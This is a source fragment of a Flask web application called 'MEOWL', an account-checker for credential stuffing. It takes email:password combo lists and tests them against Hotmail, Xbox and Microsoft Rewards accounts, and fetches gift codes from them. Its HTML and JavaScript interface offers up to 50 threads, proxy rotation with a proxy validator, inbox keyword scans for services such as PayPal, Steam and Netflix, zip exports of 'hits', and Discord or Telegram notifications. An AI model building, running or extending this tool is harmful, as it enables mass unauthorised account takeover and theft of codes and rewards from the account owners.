                out['gamertag']   = r['data'].get('gamertag')
                out['gamepass']   = r['data'].get('gamepass_type')
        elif checker_type == 'rewards':
            chk = RewardsChecker(proxy=proxy)
            status, result = chk.check_account(email, password)
            out['status'] = status
            out['diag'] = chk._diag
            if isinstance(result, dict):
                out['result'] = {k: v for k, v in result.items()
                                 if k in ('points', 'level', 'country', 'name')}
        elif checker_type == 'codefetcher':
            diag = {}
            codes = _fetch_codes_for_account(email, password, proxy=proxy, diag=diag)
            out['status'] = 'CODES' if codes else 'BAD'
            out['diag'] = diag
            out['codes'] = codes
        else:
            chk = MicrosoftInboxChecker(email, password, proxy=proxy, inbox_keywords=['Steam'])
            status = chk.login()
            out['status'] = status
            out['diag'] = chk._diag
    except Exception as e:
        out['status'] = 'EXCEPTION'
        out['error'] = str(e)[:200]
    return jsonify(out)

def _build_zip(s: CheckSession) -> BytesIO:
    buf = BytesIO()
    status = "STOPPED" if s.stopped else "COMPLETE"
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
        if s.checker_type == "codefetcher":
            z.writestr('summary.txt',
                f"MEOWL — CODE FETCHER\nStatus: {status}\nTotal: {s.total}\n"
                f"Checked: {s.checked}\nValid: {s.valid}\nCodes: {len(s.codes_found)}\n"
                f"Accounts w/ Codes: {s.accounts_with_codes}\n2FA: {s.twofa}\n"
                f"Bad: {s.bad}\nErrors: {s.errors}\n"
                f"Threads: {s.threads}\n"
                f"Proxied: {'yes' if len(s.proxy_pool.proxies) else 'no'}\n")
            z.writestr('codes.txt', '\n'.join(c['code'] for c in s.codes_found))
            z.writestr('detailed_codes.txt',
                '\n'.join(f"{c['code']} | {c['email']} | {c['info']}" for c in s.codes_found))
        else:
            z.writestr('Summary.txt',
                f"MEOWL\nStatus: {status}\nTotal: {s.total}\nChecked: {s.checked}\n"
                f"Valid: {s.valid}\nInbox: {s.inbox}\n2FA: {s.twofa}\n"
                f"Bad: {s.bad}\nErrors: {s.errors}\n"
                f"Premium: {s.premium}\nFree: {s.free}\n"
                f"Rewards Hits: {s.rewards_hits}\nRewards Points: {s.rewards_points}\n"
                f"Keywords: {', '.join(s.keywords)}\n"
                f"Threads: {s.threads}\n"
                f"Proxied: {'yes' if len(s.proxy_pool.proxies) else 'no'}\n")
            for key, fname in [('valid', 'Valid.txt'), ('twofa', '2FA.txt'),
                               ('banned', 'Banned.txt'), ('premium', 'Premium.txt'),
                               ('free', 'Free.txt'), ('games', 'Games_List.txt'),
                               ('rewards_hits', 'Rewards_Hits.txt'),
                               ('rewards_zero', 'Rewards_Zero.txt'),
                               ('rewards_custom', 'Rewards_Custom.txt'),
                               ('rewards_rate_limit', 'Rewards_Rate_Limited.txt')]:
                if s.results.get(key):
                    z.writestr(fname, '\n'.join(s.results[key]))
            for kw, hits in s.keyword_details.items():
                safe = re.sub(r'[<>:"/\\|?*]', '_', kw.strip()) or 'keyword'
                z.writestr(f'Keywords/{safe}.txt', '\n'.join(hits))
    buf.seek(0)
    return buf

@app.route('/api/download/<sid>')
def api_download(sid):
    s = sessions.get(sid)
    if not s: return "session not found", 404
    try:
        buf = _build_zip(s)
        resp = make_response(buf.getvalue())
        resp.headers['Content-Type'] = 'application/zip'
        resp.headers['Content-Disposition'] = f'attachment; filename="MEOWL-RESULTS-{s.filename}.zip"'
        return resp
    except Exception as e:
        print(f"Download error: {e}")
        return f"Error creating zip: {e}", 500

# ===== HTML =====
HTML_PAGE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="theme-color" content="#010814">
<link rel="manifest" href="/manifest.json">
<title>MEOWL // CHECKER</title>
<style>
:root{
  color-scheme: dark;
  --bg-start:#010814; --bg-end:#0a1a33;
  --panel:#0d1f38; --panel-2:#13284a; --border:#1d3557;
  --primary:#00b4d8; --secondary:#0077b6; --warn:#fca311; --danger:#ef233c;
  --text:#e0e6ed; --muted:#7b8ba7;
  --font:'JetBrains Mono','Fira Code','Courier New',monospace;
}
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
html,body{min-height:100vh; background-color:var(--bg-start);}
body{
  background: linear-gradient(135deg, var(--bg-start) 0%, var(--bg-end) 100%);
  background-attachment: fixed;
  color:var(--text); font-family:var(--font); font-size:14px;
  padding:12px; padding-bottom:40px; overflow-x:hidden;
  background-image:
    radial-gradient(circle at 20% 0%,rgba(0,180,216,.08) 0%,transparent 55%),
    radial-gradient(circle at 80% 100%,rgba(0,119,182,.08) 0%,transparent 55%),
    linear-gradient(rgba(0,180,216,.05) 1px,transparent 1px),
    linear-gradient(90deg,rgba(0,180,216,.05) 1px,transparent 1px);
  background-size:100% 100%,100% 100%,28px 28px,28px 28px;
}
body::after{
  content:''; position:fixed; inset:0; pointer-events:none; z-index:9999;
  background:repeating-linear-gradient(0deg,rgba(0,0,0,.12) 0 1px,transparent 1px 3px);
}
h1{
  font-size:26px; letter-spacing:4px; text-align:center; padding:16px 0 4px;
  color:var(--primary); text-shadow:0 0 12px rgba(0,180,216,.7);
  animation:glitch 4s infinite;
}
h1 span{color:var(--secondary); text-shadow:0 0 12px rgba(0,119,182,.7)}
@keyframes glitch{
  0%,94%,100%{transform:translate(0,0)}
  95%{transform:translate(-1px,1px)}
  96%{transform:translate(2px,-1px)}
  97%{transform:translate(-2px,0)}
}
.tabs { display: flex; gap: 4px; margin-bottom: 12px; background: var(--panel); border: 1px solid var(--border); border-radius: 8px; padding: 4px; margin-top: 16px;}
.tab { flex: 1; text-align: center; padding: 10px 4px; border-radius: 6px; font-size: 11px; letter-spacing: 1px; text-transform: uppercase; cursor: pointer; transition: all .15s; color: var(--muted); }
.tab:hover { color: var(--text); }
.tab.active { background: rgba(0,180,216,.15); color: var(--primary); font-weight: 700; box-shadow: 0 0 10px rgba(0,180,216,.2) inset; }

.panel{ background:var(--panel); border:1px solid var(--border); border-radius:8px; padding:14px; margin-bottom:12px; position:relative; }
.panel::before{ content:''; position:absolute; top:0; left:14px; right:14px; height:1px; background:linear-gradient(90deg,transparent,var(--primary),transparent); opacity:.4; }
.label{ font-size:10px; letter-spacing:2px; color:var(--muted); text-transform:uppercase; margin-bottom:8px; }
textarea,input[type=text],input[type=password],input[type=color]{
  width:100%; background:var(--panel-2); color:var(--text); border:1px solid var(--border);
  border-radius:6px; padding:10px; font-family:var(--font); font-size:14px; outline:none;
  transition:border .15s; -webkit-appearance: none; appearance: none;
}
input[type=color]{ padding: 2px; height: 40px; cursor: pointer; }
textarea:focus,input:focus{border-color:var(--primary)}
textarea{resize:vertical;min-height:100px}
.file-wrap{position:relative}
.file-wrap input[type=file]{opacity:0;position:absolute;inset:0;cursor:pointer}
.file-btn{ border:1px dashed var(--border); border-radius:6px; padding:12px; text-align:center; color:var(--muted); font-size:11px; cursor:pointer; transition:all .15s; }
.file-btn:hover{border-color:var(--primary);color:var(--primary)}
.grid{display:grid;gap:8px;grid-template-columns:1fr 1fr}
.card{ background:var(--panel-2); border:1px solid var(--border); border-radius:6px; padding:12px 10px; text-align:center; cursor:pointer; transition:all .15s; font-size:13px; user-select:none; }
.card:hover{border-color:var(--secondary)}
.card.active{ border-color:var(--primary); background:rgba(0,180,216,.1); color:var(--primary); box-shadow:0 0 12px rgba(0,180,216,.3) inset; }
.card .em{font-size:20px;display:block;margin-bottom:4px}
.kw-wrap{display:flex;flex-wrap:wrap;gap:6px;margin-top:4px}
.kw{ padding:6px 12px; border-radius:16px; border:1px solid var(--border); background:var(--panel-2); font-size:12px; cursor:pointer; user-select:none; transition:all .12s; color:var(--muted); }
.kw:hover{border-color:var(--secondary)}
.kw.active{ border-color:var(--primary); color:var(--primary); background:rgba(0,180,216,.1); box-shadow:0 0 8px rgba(0,180,216,.4); }
.toggle-row{display:flex;align-items:center;gap:10px;margin-bottom:8px}
.toggle{ position:relative; width:44px; height:24px; background:var(--panel-2); border:1px solid var(--border); border-radius:12px; cursor:pointer; transition:all .2s; flex-shrink:0; }
.toggle::after{ content:''; position:absolute; top:2px; left:2px; width:18px; height:18px; border-radius:50%; background:var(--muted); transition:all .2s; }
.toggle.on{background:rgba(0,180,216,.15);border-color:var(--primary)}
.toggle.on::after{left:22px;background:var(--primary);box-shadow:0 0 8px var(--primary)}
.toggle-label{font-size:12px;color:var(--muted)}
.toggle-label b{color:var(--secondary)}
.btn-row{display:flex;gap:8px;margin-top:8px}
button{
  flex:1; padding:14px; border-radius:6px; border:1px solid var(--border);
  background:var(--panel-2); color:var(--text); font-family:var(--font);
  font-size:13px; letter-spacing:1.5px; cursor:pointer; transition:all .15s;
  text-transform:uppercase; font-weight:600; min-height:44px;
  -webkit-appearance: none; appearance: none;
}
button:hover:not(:disabled){border-color:var(--primary);color:var(--primary)}
button:disabled{opacity:.35;cursor:not-allowed}
#start-btn{border-color:var(--primary);color:var(--primary);background:rgba(0,180,216,.06)}
#test-btn{border-color:var(--secondary);color:var(--secondary);background:rgba(0,119,182,.06);max-width:80px;font-size:11px;padding:10px}
#stop-btn{border-color:var(--danger);color:var(--danger);background:rgba(239,35,60,.06)}
#download-btn{border-color:var(--secondary);color:var(--secondary);background:rgba(0,119,182,.06)}
#menu-btn{border-color:var(--muted);color:var(--muted);background:rgba(123,139,167,.06);flex:0.5}
.hidden{display:none!important}
.bar-wrap{ height:22px; background:var(--panel-2); border:1px solid var(--border); border-radius:4px; overflow:hidden; position:relative; margin:8px 0; }
.bar-fill{ height:100%; width:0%; background:linear-gradient(90deg,var(--secondary),var(--primary)); transition:width .4s ease; position:relative; }
.bar-fill::after{ content:''; position:absolute; inset:0; background:repeating-linear-gradient(45deg,rgba(0,0,0,.15) 0 6px,transparent 6px 12px); animation:slide 1s linear infinite; }
@keyframes slide{from{background-position:0 0}to{background-position:24px 0}}
.bar-text{ position:absolute; inset:0; display:flex; align-items:center; justify-content:center; font-size:11px; color:var(--text); text-shadow:0 0 4px #000; font-weight:600; letter-spacing:1px; }
.stats{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-top:10px}
.stat{background:var(--panel-2);border:1px solid var(--border);border-radius:4px;padding:8px 10px}
.stat .k{font-size:9px;letter-spacing:1.5px;color:var(--muted);text-transform:uppercase}
.stat .v{font-size:16px;font-weight:700;margin-top:2px;color:var(--primary)}
.stat.warn .v{color:var(--warn)}
.stat.danger .v{color:var(--danger)}
.stat.cyan .v{color:var(--secondary)}
.status-row{display:flex;align-items:center;gap:8px;font-size:12px;color:var(--muted);margin-bottom:8px}
.dot{width:8px;height:8px;border-radius:50%;background:var(--muted);flex-shrink:0}
.dot.running{background:var(--primary);animation:pulse 1.2s infinite}
.dot.stopped{background:var(--warn)}
.dot.done{background:var(--secondary)}
@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(0,180,216,.7)}50%{box-shadow:0 0 0 8px rgba(0,180,216,0)}}
.hits{ background:var(--panel-2); border:1px solid var(--border); border-radius:6px; max-height:340px; overflow-y:auto; font-size:12px; }
.hit{ display:flex; gap:8px; padding:6px 10px; border-bottom:1px solid rgba(255,255,255,.03); animation:fadein .25s ease; }
.hit:last-child{border-bottom:none}
@keyframes fadein{from{opacity:0;transform:translateX(-6px)}to{opacity:1;transform:translateX(0)}}
.hit .t{color:var(--muted);font-size:10px;min-width:56px;flex-shrink:0}
.hit .c{font-size:9px;padding:1px 5px;border-radius:3px;min-width:56px;text-align:center;letter-spacing:1px;flex-shrink:0;align-self:flex-start;font-weight:700}
.hit .c.green{background:rgba(0,180,216,.12);color:var(--primary)}
.hit .c.gold{background:rgba(252,163,17,.12);color:var(--warn)}
.hit .c.cyan{background:rgba(0,119,182,.12);color:var(--secondary)}
.hit .c.warn{background:rgba(252,163,17,.12);color:var(--warn)}
.hit .c.danger{background:rgba(239,35,60,.12);color:var(--danger)}
.hit .m{color:var(--text);word-break:break-all;flex:1}
.empty{text-align:center;padding:24px;color:var(--muted);font-size:12px}
.diag-box{ background:#000; border:1px solid var(--border); border-radius:6px; padding:10px; font-size:11px; max-height:300px; overflow:auto; white-space:pre-wrap; word-break:break-all; color:var(--text); font-family:var(--font); line-height:1.5; }
.diag-box .k{color:var(--secondary)}
.diag-box .v{color:var(--primary)}
.diag-box .err{color:var(--danger)}
.slider-row{display:flex;align-items:center;gap:12px}
.slider-row input[type=range]{ flex:1; -webkit-appearance:none; appearance:none; height:6px; background:var(--panel-2); border:1px solid var(--border); border-radius:3px; outline:none; }
.slider-row input[type=range]::-webkit-slider-thumb{ -webkit-appearance:none; appearance:none; width:22px; height:22px; border-radius:50%; background:var(--primary); cursor:pointer; box-shadow:0 0 8px rgba(0,180,216,.7); }
.slider-row input[type=range]::-moz-range-thumb{ width:22px; height:22px; border-radius:50%; background:var(--primary); cursor:pointer; border:none; box-shadow:0 0 8px rgba(0,180,216,.7); }
.slider-val{color:var(--primary);font-weight:700;font-size:16px;min-width:28px;text-align:right}
.last-results-pill{ background:rgba(252,163,17,.08); border:1px solid var(--warn); border-radius:8px; padding:10px 14px; margin-bottom:12px; display:flex; align-items:center; gap:10px; font-size:12px; flex-wrap:wrap; }
.last-results-pill .info{flex:1;min-width:100px}
.last-results-pill .info b{color:var(--warn)}
.last-results-pill .info .sid{color:var(--secondary);font-size:10px}
.last-results-pill button{ flex:none; padding:8px 14px; font-size:11px; min-height:auto; border-color:var(--warn); color:var(--warn); background:rgba(252,163,17,.06); }
.last-results-pill button#last-resume-btn{border-color:var(--primary);color:var(--primary);background:rgba(0,180,216,.06)}
.last-results-pill button#last-view-btn{border-color:var(--secondary);color:var(--secondary);background:rgba(0,119,182,.06)}
.footer{text-align:center;color:var(--muted);font-size:10px;letter-spacing:2px;margin-top:24px}
.settings-row { margin-bottom: 12px; }
.settings-row label { display: block; font-size: 11px; color: var(--muted); margin-bottom: 4px; text-transform: uppercase; letter-spacing: 1px;}
.color-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 12px;}
.links-row { display: flex; gap: 8px; margin-top: 12px; flex-wrap: wrap;}
.links-row a { flex: 1; text-align: center; padding: 10px; background: var(--panel-2); border-radius: 6px; color: var(--primary); text-decoration: none; font-size: 12px; border: 1px solid var(--border); text-transform: uppercase; font-weight: bold;}
.proxy-table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 11px;}
.proxy-table th, .proxy-table td { padding: 6px; text-align: left; border-bottom: 1px solid var(--border); }
.proxy-table th { color: var(--secondary); }
.proxy-table td.valid { color: var(--primary); font-weight: bold;}
.proxy-table td.dead { color: var(--danger); }
.validator-actions { display: flex; gap: 8px; margin-top: 8px;}

/* Modal */
.modal-overlay {
  position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 10000;
  display: flex; align-items: center; justify-content: center; padding: 20px;
  backdrop-filter: blur(4px);
}
.modal-box {
  background: var(--panel); border: 1px solid var(--warn); border-radius: 8px;
  padding: 20px; max-width: 400px; width: 100%; text-align: center;
  box-shadow: 0 0 20px rgba(252,163,17,.2);
}
.modal-box h2 { color: var(--warn); margin-bottom: 10px; font-size: 18px; letter-spacing: 1px;}
.modal-box p { font-size: 13px; color: var(--text); margin-bottom: 20px; line-height: 1.5;}
.modal-btns { display: flex; gap: 10px; }
.modal-btns button { padding: 12px; }
#modal-yes { border-color: var(--primary); color: var(--primary); background: rgba(0,180,216,.1);}
#modal-no { border-color: var(--danger); color: var(--danger); background: rgba(239,35,60,.1);}
</style>
</head>
<body>

<div id="proxy-modal" class="modal-overlay hidden">
  <div class="modal-box">
    <h2>PROXIES DEPLETED</h2>
    <p>All proxies in the pool have failed or are dead. Would you like to switch to a direct connection (proxyless) to finish the check?</p>
    <div class="modal-btns">
      <button id="modal-yes">YES, CONTINUE</button>
      <button id="modal-no">NO, STOP</button>
    </div>
  </div>
</div>

<h1>▰ MEO<span>WL</span> ▰</h1>

<div class="tabs">
  <div class="tab active" onclick="switchTab('checker')">Checker</div>
  <div class="tab" onclick="switchTab('validator')">Validator</div>
  <div class="tab" onclick="switchTab('settings')">Settings</div>
</div>

<!-- ================= CHECKER TAB ================= -->
<div id="tab-checker">
  <div id="setup">
    <div class="last-results-pill hidden" id="last-results-pill">
      <div class="info" id="last-results-info">Last run ready <span class="sid" id="last-sid"></span></div>
      <button id="last-resume-btn" class="hidden">Resume</button>
      <button id="last-view-btn" class="hidden">View Live</button>
      <button id="last-download-btn" class="hidden">Download</button>
    </div>

    <div class="panel">
      <div class="label">01 · Accounts</div>
      <div class="file-wrap">
        <input type="file" id="file-input" accept=".txt">
        <div class="file-btn">[ + ] load accounts .txt</div>
      </div>
      <textarea id="accounts" placeholder="email:password&#10;email:password&#10;..." style="margin-top:8px"></textarea>
      <div style="font-size:11px;color:var(--muted);margin-top:6px;text-align:right">
        <span id="account-count">0</span> loaded
      </div>
    </div>

    <div class="panel">
      <div class="label">02 · Checker Type</div>
      <div class="grid" id="checker-grid">
        <div class="card active" data-type="hotmail"><span class="em">📧</span>Hotmail</div>
        <div class="card" data-type="xbox"><span class="em">🎮</span>Xbox</div>
        <div class="card" data-type="rewards"><span class="em">⭐</span>Rewards</div>
        <div class="card" data-type="codefetcher"><span class="em">🎁</span>Codes</div>
      </div>
    </div>

    <div class="panel" id="keyword-panel">
      <div class="label">03 · Keywords (Hotmail only)</div>
      <div class="kw-wrap" id="kw-wrap">
        <div class="kw" data-kw="Roblox">Roblox</div>
        <div class="kw active" data-kw="Steam">Steam</div>
        <div class="kw active" data-kw="Netflix">Netflix</div>
        <div class="kw active" data-kw="PayPal">PayPal</div>
        <div class="kw" data-kw="noreply@instagram.com">Instagram</div>
        <div class="kw" data-kw="Discord">Discord</div>
        <div class="kw" data-kw="Minecraft">Minecraft</div>
        <div class="kw" data-kw="Spotify">Spotify</div>
      </div>
      <input type="text" id="custom-kw" placeholder="+ custom keyword (comma separated)" style="margin-top:8px">
    </div>

    <div class="panel">
      <div class="label">04 · Proxy</div>
      <div class="toggle-row">
        <div class="toggle" id="proxy-toggle"></div>
        <div class="toggle-label">Mode: <b id="proxy-mode-label">Proxyless</b></div>
      </div>
      <div id="proxy-box" class="hidden">
        <div class="file-wrap" style="margin-bottom:8px">
          <input type="file" id="proxy-file" accept=".txt">
          <div class="file-btn">[ + ] upload proxy .txt</div>
        </div>
        <textarea id="proxies" placeholder="host:port&#10;user:pass@host:port&#10;host:port:user:pass&#10;http://host:port&#10;socks5://host:port"></textarea>
        <div style="font-size:11px;color:var(--muted);margin-top:6px">
          One per line · round-robin per account
        </div>
      </div>
    </div>

    <div class="panel">
      <div class="label">05 · Threads</div>
      <div class="slider-row">
        <input type="range" id="threads-slider" min="1" max="50" value="30">
        <span class="slider-val" id="threads-val">30</span>
      </div>
      <div style="font-size:11px;color:var(--muted);margin-top:6px">
        Concurrent workers · 1 to 50
      </div>
    </div>

    <div class="btn-row">
      <button id="test-btn" title="Test first account">Test</button>
      <button id="start-btn">▶ Start</button>
    </div>

    <div class="panel hidden" id="diag-panel">
      <div class="label">Test Diagnostic</div>
      <div class="diag-box" id="diag-box"></div>
    </div>
  </div>

  <div id="live" class="hidden">
    <div class="panel">
      <div class="status-row">
        <div class="dot running" id="status-dot"></div>
        <span id="status-text">Running…</span>
        <span style="margin-left:auto;color:var(--secondary)" id="session-id"></span>
      </div>
      <div class="bar-wrap">
        <div class="bar-fill" id="bar-fill"></div>
        <div class="bar-text" id="bar-text">0%</div>
      </div>
      <div class="stats" id="stats-grid"></div>
    </div>

    <div class="panel">
      <div class="label">Live Hits</div>
      <div class="hits" id="hits">
        <div class="empty">waiting for hits…</div>
      </div>
    </div>

    <div class="btn-row">
      <button id="menu-btn">☰ Menu</button>
      <button id="stop-btn">⏹ Stop</button>
      <button id="download-btn">⬇ Download</button>
    </div>
  </div>
</div>

<!-- ================= VALIDATOR TAB ================= -->
<div id="tab-validator" class="hidden">
  <div class="panel">
    <div class="label">Proxy Validator</div>
    <div class="file-wrap" style="margin-bottom:8px">
      <input type="file" id="val-proxy-file" accept=".txt">
      <div class="file-btn">[ + ] upload proxy .txt</div>
    </div>
    <textarea id="val-proxies" placeholder="Paste proxies here...&#10;http://host:port&#10;socks5://host:port&#10;user:pass@host:port"></textarea>
    <div class="validator-actions">
      <button id="val-start-btn" style="border-color:var(--primary);color:var(--primary);">▶ Validate</button>
      <button id="val-copy-btn" style="border-color:var(--secondary);color:var(--secondary);">Copy Valid</button>
      <button id="val-download-btn" style="border-color:var(--secondary);color:var(--secondary);">⬇ .txt</button>
    </div>
    <div style="margin-top:10px; font-size:12px; color:var(--muted);" id="val-stats">
      Waiting to validate...
    </div>
  </div>

  <div class="panel" id="val-results-panel" style="display:none;">
    <div class="label">Results</div>
    <div style="max-height:400px; overflow-y:auto;">
      <table class="proxy-table">
        <thead>
          <tr><th>Proxy</th><th>Status</th><th>Time</th><th>IP</th></tr>
        </thead>
        <tbody id="val-results-body"></tbody>
      </table>
    </div>
  </div>
</div>

<!-- ================= SETTINGS TAB ================= -->
<div id="tab-settings" class="hidden">
  <div class="panel">
    <div class="label">UI Theme</div>
    <div class="color-grid">
      <div>
        <label style="font-size:10px;color:var(--muted);">Primary Color</label>
        <input type="color" id="set-primary" value="#00b4d8" oninput="updateThemePreview()">
      </div>
      <div>
        <label style="font-size:10px;color:var(--muted);">Secondary Color</label>
        <input type="color" id="set-secondary" value="#0077b6" oninput="updateThemePreview()">
      </div>
    </div>
  </div>

  <div class="panel">
    <div class="label">Notifications</div>
    <div class="settings-row">
      <label>Discord Webhook URL</label>
      <input type="text" id="set-discord" placeholder="https://discord.com/api/webhooks/...">
    </div>
    <div class="settings-row">
      <label>Telegram Bot Token</label>
      <input type="text" id="set-tg-token" placeholder="123456:ABC-DEF...">
    </div>
    <div class="settings-row">
      <label>Telegram Chat ID</label>
      <input type="text" id="set-tg-chat" placeholder="-100123456789">
    </div>
  </div>

  <div class="panel">
    <div class="label">Community Links</div>
    <div class="settings-row">
      <label>Discord Invite Link</label>
      <input type="text" id="set-discord-inv" placeholder="https://discord.gg/...">
    </div>
    <div class="settings-row">
      <label>Telegram Channel Link</label>
      <input type="text" id="set-tg-inv" placeholder="https://t.me/...">
    </div>
    <div class="links-row">
      <a href="#" id="link-discord" target="_blank" style="display:none;">Join Discord</a>
      <a href="#" id="link-tg" target="_blank" style="display:none;">Join Telegram</a>
    </div>
  </div>

  <div class="btn-row">
    <button id="settings-save-btn" style="border-color:var(--primary);color:var(--primary);">💾 Save Settings</button>
    <button id="settings-reset-btn" style="border-color:var(--danger);color:var(--danger);">🔄 Reset UI</button>
  </div>
</div>

<div class="footer">MEOWL · <b>LOCAL</b> · 127.0.0.1</div>

<script>
const state = {
  sessionId: null,
  polling: null,
  checkerType: 'hotmail',
  keywords: new Set(['Steam','Netflix','PayPal']),
  proxyOn: false,
  settings: {},
  validProxies: [],
  modalShown: false
};

// TABS
function switchTab(name) {
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  document.querySelector(`.tab[onclick="switchTab('${name}')"]`).classList.add('active');
  
  document.getElementById('tab-checker').classList.add('hidden');
  document.getElementById('tab-validator').classList.add('hidden');
  document.getElementById('tab-settings').classList.add('hidden');
  
  document.getElementById('tab-' + name).classList.remove('hidden');
  
  if (name === 'settings') loadSettings();
}

// SETTINGS LOGIC
async function loadSettings() {
  const r = await fetch('/api/settings');
  const s = await r.json();
  state.settings = s;
  
  document.getElementById('set-primary').value = s.color_primary || '#00b4d8';
  document.getElementById('set-secondary').value = s.color_secondary || '#0077b6';
  document.getElementById('set-discord').value = s.discord_webhook || '';
  document.getElementById('set-tg-token').value = s.tg_token || '';
  document.getElementById('set-tg-chat').value = s.tg_chat_id || '';
  document.getElementById('set-discord-inv').value = s.discord_invite || '';
  document.getElementById('set-tg-inv').value = s.tg_invite || '';
  
  applyTheme();
  updateLinks();
}

function updateThemePreview() {
  document.documentElement.style.setProperty('--primary', document.getElementById('set-primary').value);
  document.documentElement.style.setProperty('--secondary', document.getElementById('set-secondary').value);
}

function applyTheme() {
  document.documentElement.style.setProperty('--primary', state.settings.color_primary || '#00b4d8');
  document.documentElement.style.setProperty('--secondary', state.settings.color_secondary || '#0077b6');
}

function updateLinks() {
  const dLink = document.getElementById('link-discord');
  const tLink = document.getElementById('link-tg');
  
  if (state.settings.discord_invite) {
    dLink.href = state.settings.discord_invite;
    dLink.style.display = 'block';
  } else { dLink.style.display = 'none'; }
  
  if (state.settings.tg_invite) {
    tLink.href = state.settings.tg_invite;
    tLink.style.display = 'block';
  } else { tLink.style.display = 'none'; }
}

document.getElementById('settings-save-btn').addEventListener('click', async () => {
  const body = {
    color_primary: document.getElementById('set-primary').value,
    color_secondary: document.getElementById('set-secondary').value,
    discord_webhook: document.getElementById('set-discord').value,
    tg_token: document.getElementById('set-tg-token').value,
    tg_chat_id: document.getElementById('set-tg-chat').value,
    discord_invite: document.getElementById('set-discord-inv').value,
    tg_invite: document.getElementById('set-tg-inv').value,
  };
  await fetch('/api/settings', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(body)});
  state.settings = body;
  applyTheme();
  updateLinks();
  alert('Settings saved!');
});

document.getElementById('settings-reset-btn').addEventListener('click', () => {
  document.getElementById('set-primary').value = '#00b4d8';
  document.getElementById('set-secondary').value = '#0077b6';
  updateThemePreview();
});

// PROXY VALIDATOR LOGIC
document.getElementById('val-proxy-file').addEventListener('change', async e => {
  const f = e.target.files[0]; if (!f) return;
  const text = await f.text();
  const ta = document.getElementById('val-proxies');
  const existing = ta.value.trim();
  ta.value = (existing ? existing + '\n' : '') + text.trim();
});

document.getElementById('val-start-btn').addEventListener('click', async () => {
  const raw = document.getElementById('val-proxies').value.split('\n').map(x=>x.trim()).filter(Boolean);
  if (!raw.length) return alert('No proxies to validate');
  
  document.getElementById('val-start-btn').disabled = true;
  document.getElementById('val-start-btn').textContent = 'Validating...';
  document.getElementById('val-stats').innerHTML = `Checking <b>${raw.length}</b> proxies... (please wait)`;
  document.getElementById('val-results-panel').style.display = 'none';
  
  try {
    const r = await fetch('/api/validate', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({proxies: raw})
    });
    const data = await r.json();
    
    state.validProxies = data.filter(d => d.status === 'Valid');
    const validCount = state.validProxies.length;
    const total = data.length;
    
    document.getElementById('val-stats').innerHTML = `Checked: <b>${total}</b> &nbsp;|&nbsp; Valid: <b style="color:var(--primary)">${validCount}</b> &nbsp;|&nbsp; Dead: <b style="color:var(--danger)">${total - validCount}</b>`;
    
    const tbody = document.getElementById('val-results-body');
    tbody.innerHTML = data.map(d => `
      <tr>
        <td style="word-break:break-all">${esc(d.proxy)}</td>
        <td class="${d.status === 'Valid' ? 'valid' : 'dead'}">${esc(d.status)}</td>
        <td>${d.time}s</td>
        <td>${d.ip || '-'}</td>
      </tr>
    `).join('');
    
    document.getElementById('val-results-panel').style.display = 'block';
  } catch(e) {
    alert('Validation failed: ' + e.message);
  }
  
  document.getElementById('val-start-btn').disabled = false;
  document.getElementById('val-start-btn').textContent = '▶ Validate';
});

document.getElementById('val-copy-btn').addEventListener('click', () => {
  if (!state.validProxies.length) return alert('No valid proxies to copy');
  const text = state.validProxies.map(p => p.proxy).join('\n');
  navigator.clipboard.writeText(text).then(() => alert('Copied valid proxies to clipboard!'));
});

document.getElementById('val-download-btn').addEventListener('click', () => {
  if (!state.validProxies.length) return alert('No valid proxies to download');
  const text = state.validProxies.map(p => p.proxy).join('\n');
  const blob = new Blob([text], {type: 'text/plain'});
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'valid_proxies.txt';
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
});

// CHECKER LOGIC
document.getElementById('file-input').addEventListener('change', async e => {
  const f = e.target.files[0]; if (!f) return;
  const text = await f.text();
  document.getElementById('accounts').value = text.trim();
  updateCount();
});

document.getElementById('proxy-file').addEventListener('change', async e => {
  const f = e.target.files[0]; if (!f) return;
  const text = await f.text();
  const ta = document.getElementById('proxies');
  const existing = ta.value.trim();
  ta.value = (existing ? existing + '\n' : '') + text.trim();
});

const accTa = document.getElementById('accounts');
accTa.addEventListener('input', updateCount);
function updateCount(){
  const n = accTa.value.split('\n').filter(l => l.trim()).length;
  document.getElementById('account-count').textContent = n;
}

document.getElementById('checker-grid').addEventListener('click', e => {
  const card = e.target.closest('.card'); if (!card) return;
  document.querySelectorAll('#checker-grid .card').forEach(c => c.classList.remove('active'));
  card.classList.add('active');
  state.checkerType = card.dataset.type;
  document.getElementById('keyword-panel').classList.toggle('hidden',
    state.checkerType !== 'hotmail');
});

document.getElementById('kw-wrap').addEventListener('click', e => {
  const kw = e.target.closest('.kw'); if (!kw) return;
  const v = kw.dataset.kw;
  if (state.keywords.has(v)) { state.keywords.delete(v); kw.classList.remove('active'); }
  else { state.keywords.add(v); kw.classList.add('active'); }
});

const toggle = document.getElementById('proxy-toggle');
const proxyBox = document.getElementById('proxy-box');
const proxyLabel = document.getElementById('proxy-mode-label');
toggle.addEventListener('click', () => {
  state.proxyOn = !state.proxyOn;
  toggle.classList.toggle('on', state.proxyOn);
  proxyBox.classList.toggle('hidden', !state.proxyOn);
  proxyLabel.textContent = state.proxyOn ? 'Proxy' : 'Proxyless';
  proxyLabel.style.color = state.proxyOn ? 'var(--primary)' : 'var(--secondary)';
});

const threadsSlider = document.getElementById('threads-slider');
const threadsVal = document.getElementById('threads-val');
threadsSlider.addEventListener('input', () => {
  threadsVal.textContent = threadsSlider.value;
});

function getProxies(){
  if (!state.proxyOn) return [];
  return document.getElementById('proxies').value.split('\n').map(x => x.trim()).filter(Boolean);
}
function getKeywords(){
  const custom = document.getElementById('custom-kw').value.split(',')
                  .map(x => x.trim()).filter(Boolean);
